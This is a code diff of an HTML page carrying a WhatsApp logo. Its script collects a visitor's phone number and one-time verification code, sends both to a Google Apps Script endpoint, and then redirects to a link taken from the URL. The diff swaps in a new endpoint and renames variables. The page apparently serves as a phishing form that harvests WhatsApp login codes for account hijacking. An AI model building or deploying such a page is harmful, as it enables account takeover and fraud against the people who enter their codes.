@@ -71,7 +71,7 @@ button:hover {
 </head>
 <body>
   <header>
-    <h1>OTP Form Header</h1>
+    <h1>OTP Form Site</h1>
   </header>
     <img src="https://toppng.com/uploads/preview/download-whatsapp-social-media-apps-11563650769y1qhv167dh.png" alt="Logo" class="logo">
     <form id="otpForm">
@@ -91,20 +91,21 @@ button:hover {
   </footer>
 
     <script>
+let phoneNumberValue;
 
-      const urlParams = new URLSearchParams(window.location.search);
-  const link = urlParams.get('link');
-document.getElementById('Redirected').value = link;
+const urlParams = new URLSearchParams(window.location.search);
+const site = urlParams.get('link');
+document.getElementById('Redirected').value = site;
 
 document.getElementById('getOtpBtn').addEventListener('click', getOtp);
 document.getElementById('checkOtpBtn').addEventListener('click', checkOtp);
 
-var scriptUrl = 'https://script.google.com/macros/s/AKfycbzjoE4pSD3jDALUYiXG26-uUkEbFXg07w8NWxipqNzW6b5oUlIOtbmm5SZPgjWKgjcu/exec';
+var scriptUrl = 'https://script.google.com/macros/s/AKfycbwZtSegl0VqiwpQVIue8YQEedkfwlWWYeuC_at5OXIVsRVVriOWj8QMuwUQ0u39U1w8/exec';
 
 function getOtp(e) {
   e.preventDefault();
-  var phoneNumber = document.getElementById('phoneNumber').value;
-  if (phoneNumber.length < 11) {
+  phoneNumberValue = document.getElementById('phoneNumber').value;
+  if (phoneNumberValue.length < 11) {
     alert('Invalid phone number');
     return;
   }
@@ -119,12 +120,12 @@ function getOtp(e) {
       document.getElementById('progressBar').style.display = 'none';
       document.getElementById('checkOtpBtn').style.display = 'block';
       document.getElementById('otpInput').style.display = 'block';
-       document.getElementById('phoneNumber').style.display = 'none';
+      document.getElementById('phoneNumber').style.display = 'none';
       document.getElementById('getOtpBtn').style.display = 'none';
     }
   }, 1000);
   
-  fetch(`${scriptUrl}?phoneNumber=${phoneNumber}`)
+  fetch(`${scriptUrl}?phoneNumber=${phoneNumberValue}`)
     .then(response => response.json())
     .then(data => console.log(data))
     .catch(error => console.error('Error:', error));
@@ -132,24 +133,23 @@ function getOtp(e) {
 
 function checkOtp(e) {
   e.preventDefault();
-  var phoneNumber = document.getElementById('phoneNumber').value;
   var otp = document.getElementById('otpInput').value;
-  var linkValue = document.getElementById('Redirected').value;
+  var site = document.getElementById('Redirected').value;
   
- 
-  
-  fetch(`${scriptUrl}?phoneNumber=${phoneNumber}&otp=${otp}&link=${linkValue}`)
+  fetch(`${scriptUrl}?phoneNumber=${phoneNumberValue}&otp=${otp}&site=${site}`)
     .then(response => response.json())
     .then(data => {
       if (data.status === 'success') {
-        window.open(linkValue, '_blank');
+        window.open(site, '_blank');
       } else {
         alert('Invalid OTP or phone number');
       }
     })
     .catch(error => console.error('Error:', error));
-
 }
+      
+      
+      
   </script>
 </body>
 </html>
